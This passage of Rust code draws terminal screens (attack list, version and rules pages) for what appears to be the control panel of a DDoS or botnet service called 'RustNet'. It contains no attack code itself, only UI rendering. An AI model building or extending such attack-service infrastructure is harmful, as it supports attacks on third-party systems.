            client.write(format!("{}{}\x1b[38;5;240m║ {}\n\r", attack_line, " ".repeat(padding), right_panel).as_bytes()).await?;
        }
        
        if attacks.len() > 3 {
            let more_msg = format!("... and {} more attacks", attacks.len() - 3);
            let pad = left_width - visible_len(&more_msg) - 2;
            let more_line = format!("\x1b[38;5;240m║ \x1b[38;5;245m{}\x1b[38;5;240m{}║ ║                          ║ ║", more_msg, " ".repeat(pad));
            client.write(format!("{}\n\r", more_line).as_bytes()).await?;
        }
    }
    
    // Fill remaining space if needed
    let lines_used = if attacks.is_empty() { 1 } else { attacks.len().min(3) + if attacks.len() > 3 { 1 } else { 0 } };
    for i in lines_used..3 {
        let right_panel = match i {
            0 => "║  └──────────────────┘    ║ ║",
            1 => "║                          ║ ║",
            _ => "║    [REAL-TIME STATUS]    ║ ║"
        };
        client.write(format!("\x1b[38;5;240m║{}║ {}\n\r", " ".repeat(left_width), right_panel).as_bytes()).await?;
    }
    
    client.write(format!("\x1b[38;5;240m╠{}╩{}╣\n\r", 
        "═".repeat(left_width), "═".repeat(right_width)).as_bytes()).await?;
    
    // User Activity
    let your_active_label = apply_gradient("Your Active:", 39, 51);
    let attacks_num_gradient = apply_gradient(&format!("{} attacks", user_attacks.len()), 39, 51);
    let username_gradient = apply_gradient(&client.user.username, 39, 51);
    
    let left_content = format!(" {} {}", your_active_label, attacks_num_gradient);
    let left_pad = left_width.saturating_sub(visible_len(&format!(" Your Active: {} attacks", user_attacks.len())));
    
    let right_content = format!(" Username: {}", username_gradient);
    let right_pad = right_width.saturating_sub(visible_len(&format!(" Username: {}", client.user.username)));
    
    let your_attacks_line = format!("\x1b[38;5;240m║{}{}\x1b[38;5;240m║{}{}\x1b[38;5;240m║", 
        left_content, " ".repeat(left_pad), right_content, " ".repeat(right_pad));
    client.write(format!("{}\n\r", your_attacks_line).as_bytes()).await?;
    
    client.write(format!("\x1b[38;5;240m╰{}╩{}╯\n\r", 
        "═".repeat(left_width), "═".repeat(right_width)).as_bytes()).await?;
    client.write(b"\n\r").await?;
    
    Ok(())
}

pub async fn handle_version_command(client: &Arc<Client>) -> Result<()> {
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    
    let width = get_terminal_width();
    let side_width = 30;
    let main_width = width - side_width - 2;
    
    // Top border
    client.write(format!("\x1b[38;5;240m╭{}╦{}╮\n\r", "═".repeat(main_width - 1), "═".repeat(side_width)).as_bytes()).await?;
    
    // Title
    let title = apply_gradient("Server Version", 33, 51);
    let title_text = format!("§ {} §", title);
    let title_padding = main_width - visible_len("§ Server Version §") - 2;
    let left_pad = title_padding / 2;
    let right_pad = title_padding - left_pad;
    client.write(format!("\x1b[38;5;240m║{}{}{}║ ●━━━━●━━━━●━━━●━━━●━━━●━━━━● ║\n\r",
        " ".repeat(left_pad), title_text, " ".repeat(right_pad)).as_bytes()).await?;
    
    client.write(format!("\x1b[38;5;240m╠{}╢  │    │    │    │    │    │  ║\n\r", "═".repeat(main_width - 1)).as_bytes()).await?;
    
    let version = env!("CARGO_PKG_VERSION");
    let version_gradient = apply_gradient(version, 39, 51);
    let version_line = format!("\x1b[38;5;240m║ \x1b[38;5;245mVersion: {}\x1b[38;5;240m", version_gradient);
    let version_pad = main_width - visible_len(&format!("Version: {}", version)) - 2;
    client.write(format!("{}{}{}║░░▒▒▓▓████▓▓▒▒░░▒▒▓▓████▓▓▒▒░░║\n\r", version_line, " ".repeat(version_pad), " ").as_bytes()).await?;
    
    let author = "RustNet Team";
    let author_gradient = apply_gradient(author, 39, 51);
    let author_line = format!("\x1b[38;5;240m║ \x1b[38;5;245mAuthor: {}\x1b[38;5;240m", author_gradient);
    let author_pad = main_width - visible_len(&format!("Author: {}", author)) - 2;
    client.write(format!("{}{}{}║                              ║\n\r", author_line, " ".repeat(author_pad), " ").as_bytes()).await?;
    
    client.write(format!("\x1b[38;5;240m╰{}╩{}╯\n\r", "═".repeat(main_width - 1), "═".repeat(side_width)).as_bytes()).await?;
    
    client.set_breadcrumb("Home > Version").await;
    Ok(())
}

pub async fn handle_rules_command(client: &Arc<Client>) -> Result<()> {
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    
    let width = get_terminal_width();
    let side_width = 30;
    let main_width = width - side_width - 2;
    
    // Top border
    client.write(format!("\x1b[38;5;240m╭{}╦{}╮\n\r", "═".repeat(main_width - 1), "═".repeat(side_width)).as_bytes()).await?;
    
    // Title
    let title = apply_gradient("Server Rules", 33, 51);
    let title_text = format!("§ {} §", title);
    let title_padding = main_width - visible_len("§ Server Rules §") - 2;
    let left_pad = title_padding / 2;
    let right_pad = title_padding - left_pad;
    client.write(format!("\x1b[38;5;240m║{}{}{}║ ●━━━━●━━━━●━━━●━━━●━━━●━━━━● ║\n\r",
        " ".repeat(left_pad), title_text, " ".repeat(right_pad)).as_bytes()).await?;
    
    client.write(format!("\x1b[38;5;240m╠{}╢  │    │    │    │    │    │  ║\n\r", "═".repeat(main_width - 1)).as_bytes()).await?;
    
    let rules = vec![
        "1. Do not attack government websites",
        "2. Do not attack educational institutions",
        "3. Do not attack hospitals or medical facilities",
        "4. Respect other users",
        "5. No spamming in chat",
    ];
    
    for (i, rule) in rules.iter().enumerate() {
        let rule_gradient = apply_gradient(rule, 39, 51);
        let line = format!("\x1b[38;5;240m║ \x1b[38;5;245m{}. {}\x1b[38;5;240m", i + 1, rule_gradient);
        let visible = visible_len(&format!("{}. {}", i + 1, rule));
        let padding = if main_width > visible + 2 { main_width - visible - 2 } else { 0 };
        let right_panel = if i == 0 { "║░░▒▒▓▓████▓▓▒▒░░▒▒▓▓████▓▓▒▒░░║" } else { "║                              ║" };
        
        client.write(format!("{}{}{}\n\r", line, " ".repeat(padding), right_panel).as_bytes()).await?;
    }
    
    client.write(format!("\x1b[38;5;240m╰{}╩{}╯\n\r", "═".repeat(main_width - 1), "═".repeat(side_width)).as_bytes()).await?;
    
    client.set_breadcrumb("Home > Rules").await;
    Ok(())
}
